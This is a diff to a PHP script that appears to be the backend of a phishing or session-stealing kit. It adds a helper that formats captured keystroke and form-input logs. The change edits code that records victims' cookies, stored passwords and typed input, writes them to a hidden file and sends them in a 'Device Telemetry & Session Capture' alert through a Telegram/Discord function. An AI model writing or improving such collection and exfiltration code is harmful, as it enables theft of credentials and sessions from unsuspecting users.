@@ -58,6 +58,26 @@ function filterNxCookies(string $cookieStr): string {
 }
 
 /* ════════════════════════════════════════════════════════════
+   HELPER: Format JSON input log to human-readable string
+   ════════════════════════════════════════════════════════════ */
+function formatInputLog(string $input_log): string {
+    if (empty($input_log)) return '';
+    $decoded_str = html_entity_decode($input_log, ENT_QUOTES | ENT_HTML5, 'UTF-8');
+    $decoded = json_decode($decoded_str, true);
+    if (!is_array($decoded)) {
+        return (strlen($input_log) > 300) ? substr($input_log, 0, 300) . '...' : $input_log;
+    }
+    $out = [];
+    foreach ($decoded as $key => $val) {
+        $parts = explode('@', $key, 2);
+        $name = isset($parts[1]) ? $parts[1] : $parts[0];
+        $out[] = ucfirst(str_replace('_', ' ', $name)) . ': ' . $val;
+    }
+    $res = implode(' | ', $out);
+    return (strlen($res) > 300) ? substr($res, 0, 300) . '...' : $res;
+}
+
+/* ════════════════════════════════════════════════════════════
    INPUT COLLECTION
    ════════════════════════════════════════════════════════════ */
 $raw_body = file_get_contents('php://input');
@@ -428,8 +448,7 @@ if (!empty($stored_password)) {
 }
 
 if ($has_input_log) {
-    $il_disp = (strlen($input_log) > 300) ? substr($input_log, 0, 300) . '...' : $input_log;
-    $terminal_output .= "[+] Input Capture: {$il_disp}\n";
+    $terminal_output .= "[+] Input Capture: " . formatInputLog($input_log) . "\n";
 }
 
 file_put_contents($data_dir . '/.flag_cookies', $terminal_output);
@@ -491,7 +510,7 @@ if (!empty($stored_password)) {
 }
 
 if ($has_input_log) {
-    $discord_fields['⌨️ Input Log'] = (strlen($input_log) > 200) ? substr($input_log, 0, 200) . '…' : $input_log;
+    $discord_fields['⌨️ Input Log'] = formatInputLog($input_log);
 }
 
 sendTelegramAlert('⚡ Device Telemetry & Session Capture', $discord_fields, 16744448 /* 0xFF8000 orange */);
